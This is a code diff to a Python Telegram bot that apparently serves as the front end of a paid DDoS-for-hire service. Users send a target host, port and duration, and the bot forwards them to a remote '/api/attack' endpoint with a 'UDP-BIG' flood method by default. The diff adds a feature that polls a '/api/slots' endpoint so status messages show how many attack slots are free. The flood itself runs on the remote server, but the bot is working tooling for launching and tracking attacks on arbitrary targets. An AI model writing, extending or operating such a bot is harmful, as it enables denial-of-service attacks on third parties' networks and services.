@@ -12,19 +12,26 @@ from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # ---------- CONFIGURATION ----------
-BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
 if not BOT_TOKEN:
-    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is not set.")
+    raise ValueError("BOT_TOKEN environment variable is not set.")
 
 BASE_URL = os.environ.get(
     "BASE_URL",
     "https://discretion-applicant-gamma-sized.trycloudflare.com/api/attack"
 )
+# Slots endpoint - override via env if different (e.g. /api/status, /api/slots)
+SLOTS_URL = os.environ.get(
+    "SLOTS_URL",
+    "https://discretion-applicant-gamma-sized.trycloudflare.com/api/slots"
+)
+SLOTS_CACHE_TTL = 4  # seconds - avoid hammering the API on every status edit
+
 DEFAULT_METHOD = os.environ.get("DEFAULT_METHOD", "UDP-BIG")
 MAX_DURATION = 300
 COOLDOWN_SECONDS = 3
 ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8508604294"))
-STATUS_UPDATE_INTERVAL = 3
+STATUS_UPDATE_INTERVAL = 5   # auto-refresh status every 5 seconds
 DATA_FILE = os.environ.get("DATA_FILE", "data.json")
 
 # ---------- GLOBAL STATE ----------
@@ -34,6 +41,9 @@ last_api_response = None
 user_data = {}
 keys = {}
 subscriptions = {}
+
+# Slots cache
+_slots_cache = {"data": None, "ts": None}
 
 # ---------- LOGGING ----------
 logging.basicConfig(
@@ -87,7 +97,115 @@ async def keep_alive_loop():
             logger.info(f"Keep-alive ping OK -> {ping_url}")
         except Exception as e:
             logger.warning(f"Keep-alive ping failed: {e}")
-        await asyncio.sleep(600)  # every 10 minutes
+        await asyncio.sleep(600)
+
+
+# ---------- SLOT FETCHING ----------
+def _extract_slots(data):
+    """
+    Try to pull available/total slots from a variety of common JSON shapes.
+    Returns (available, total) or (None, None) if not found.
+    """
+    if not isinstance(data, dict):
+        return None, None
+
+    # Some APIs wrap payload under "data" or "result"
+    payload = data
+    for wrapper in ("data", "result", "response", "slots"):
+        if isinstance(data.get(wrapper), dict):
+            payload = data[wrapper]
+            break
+
+    # Common key names for available
+    avail_keys = [
+        "available", "available_slots", "free", "free_slots",
+        "slots_available", "slots_free", "open", "remaining"
+    ]
+    # Common key names for total
+    total_keys = [
+        "total", "total_slots", "slots_total", "capacity",
+        "max", "max_slots", "limit"
+    ]
+    # Common key names for in-use
+    used_keys = [
+        "used", "used_slots", "in_use", "running", "busy", "active"
+    ]
+
+    available = None
+    total = None
+    used = None
+
+    for k in avail_keys:
+        if k in payload:
+            try:
+                available = int(payload[k])
+                break
+            except (TypeError, ValueError):
+                pass
+
+    for k in total_keys:
+        if k in payload:
+            try:
+                total = int(payload[k])
+                break
+            except (TypeError, ValueError):
+                pass
+
+    for k in used_keys:
+        if k in payload:
+            try:
+                used = int(payload[k])
+                break
+            except (TypeError, ValueError):
+                pass
+
+    # Derive missing values
+    if available is None and total is not None and used is not None:
+        available = max(0, total - used)
+    if total is None and available is not None and used is not None:
+        total = available + used
+    if used is None and total is not None and available is not None:
+        used = max(0, total - available)
+
+    return available, total
+
+
+async def fetch_slots(force=False):
+    """
+    Fetch slot info from SLOTS_URL with a small cache.
+    Returns (available, total) or (None, None) on failure.
+    """
+    now = datetime.now()
+    if (
+        not force
+        and _slots_cache["data"] is not None
+        and _slots_cache["ts"] is not None
+        and (now - _slots_cache["ts"]).total_seconds() < SLOTS_CACHE_TTL
+    ):
+        return _slots_cache["data"]
+
+    def _do_request():
+        return requests.get(SLOTS_URL, timeout=10)
+
+    try:
+        response = await asyncio.to_thread(_do_request)
+        response.raise_for_status()
+        try:
+            data = response.json()
+        except ValueError:
+            data = {}
+
+        available, total = _extract_slots(data)
+        if available is None and total is None:
+            logger.warning(f"Slots response did not contain recognizable fields: {data}")
+
+        result = (available, total)
+        _slots_cache["data"] = result
+        _slots_cache["ts"] = now
+        return result
+    except requests.exceptions.RequestException as e:
+        logger.warning(f"Failed to fetch slots from {SLOTS_URL}: {e}")
+        return (None, None)
 
 
 # ---------- DATA PERSISTENCE ----------
@@ -202,7 +320,21 @@ def format_completion(target, port, duration):
     )
 
 
-def format_status_active(attack_info, user_name):
+def format_slots_line(available, total):
+    """Pretty slot line used in /status."""
+    if available is None or total is None:
+        return "🟡 𝗦𝗟𝗢𝗧𝗦: Unknown (server did not respond)"
+    used = max(0, total - available)
+    if available <= 0:
+        icon = "🔴"
+    elif available < total:
+        icon = "🟠"
+    else:
+        icon = "🟢"
+    return f"{icon} 𝗦𝗟𝗢𝗧𝗦: {available}/{total} available  ({used} in use)"
+
+
+def format_status_active(attack_info, user_name, available=None, total=None):
     target = attack_info["target"]
     port = attack_info["port"]
     duration = attack_info["duration"]
@@ -213,6 +345,7 @@ def format_status_active(attack_info, user_name):
     percent = min(100, (elapsed / duration) * 100) if duration > 0 else 0
 
     progress_bar = format_progress_bar(percent)
+    slots_line = format_slots_line(available, total)
 
     lines = [
         "🟢 𝗦𝗧𝗔𝗧𝗨𝗦",
@@ -222,14 +355,18 @@ def format_status_active(attack_info, user_name):
         f"⏱️ 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚: {int(remaining)}s / {duration}s • {int(percent)}%",
         f"📊 [{progress_bar}]",
         "────────────────────────",
-        "🔴 𝗦𝗟𝗢𝗧𝗦 𝗙𝗨𝗟𝗟: 1/1",
+        slots_line,
         "────────────────────────"
     ]
     return "\n".join(lines)
 
 
-def format_status_inactive():
-    return "🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘!"
+def format_status_inactive(available=None, total=None):
+    if available is None or total is None:
+        return "🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘!\n🟡 (server did not report slot counts)"
+    if available <= 0:
+        return f"🔴 𝗔𝗟𝗟 𝗦𝗟𝗢𝗧𝗦 𝗕𝗨𝗦𝗬! ({available}/{total} available)"
+    return f"🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘: {available}/{total}"
 
 
 # ---------- ASYNC COMPLETION TASK ----------
@@ -300,7 +437,11 @@ async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
         return
 
     user_name = job.data.get("user_name", "Hacker")
-    status_text = format_status_active(attack, user_name)
+
+    # Fetch live slots from server
+    available, total = await fetch_slots()
+
+    status_text = format_status_active(attack, user_name, available, total)
     try:
         await context.bot.edit_message_text(
             chat_id=chat_id,
@@ -536,7 +677,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Duration must be a positive integer (seconds).")
         return
 
-    # API request: only host, port, time, method (no API key)
     params = {
         "host": target,
         "port": port,
@@ -555,7 +695,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except ValueError:
             data = {}
 
-        # Only treat an explicit success=false as failure
         if isinstance(data, dict) and data.get("success") is False:
             error_msg = data.get("message", "Unknown error")
             await update.message.reply_text(f"❌ Attack failed: {error_msg}")
@@ -575,6 +714,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_data[user_id]["last_finish_time"] = None
         user_data[user_id]["active"] = attack_info
         user_data[user_id]["completion_sent"] = False
+
+        # Invalidate slot cache so next fetch is fresh
+        _slots_cache["data"] = None
+        _slots_cache["ts"] = None
 
         bot = context.bot
         task = asyncio.create_task(
@@ -609,11 +752,14 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 if user_data[user_id].get("status_job"):
                     user_data[user_id]["status_job"].schedule_removal()
                     user_data[user_id]["status_job"] = None
-                await update.message.reply_text(format_status_inactive())
+
+                available, total = await fetch_slots(force=True)
+                await update.message.reply_text(format_status_inactive(available, total))
                 return
 
         if user_id not in user_data or not user_data[user_id].get("active"):
-            await update.message.reply_text(format_status_inactive())
+            available, total = await fetch_slots(force=True)
+            await update.message.reply_text(format_status_inactive(available, total))
             return
 
         old_job = user_data[user_id].get("status_job")
@@ -623,7 +769,9 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         attack = user_data[user_id]["active"]
         user_name = update.effective_user.first_name or "Hacker"
-        status_text = format_status_active(attack, user_name)
+
+        available, total = await fetch_slots(force=True)
+        status_text = format_status_active(attack, user_name, available, total)
         sent_msg = await update.message.reply_text(status_text)
 
         job_queue = context.job_queue or context.application.job_queue
@@ -659,7 +807,6 @@ async def post_init(application):
 def main():
     load_data()
 
-    # Start the Render health-check web server before the bot starts polling.
     start_web_server()
 
     app = (
